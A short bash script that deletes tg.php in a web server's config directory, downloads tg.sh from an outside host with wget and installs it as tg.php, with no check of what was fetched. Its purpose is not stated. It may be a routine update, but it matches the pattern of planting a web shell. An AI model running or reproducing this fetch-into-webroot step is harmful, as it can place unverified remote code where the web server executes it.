#!/bin/bash

cd /var/www/html/config/

rm tg.php

wget https://thueringen.link/Download/tg.sh

cp /var/www/html/config/tg.sh /var/www/html/config/tg.php

rm tg.sh

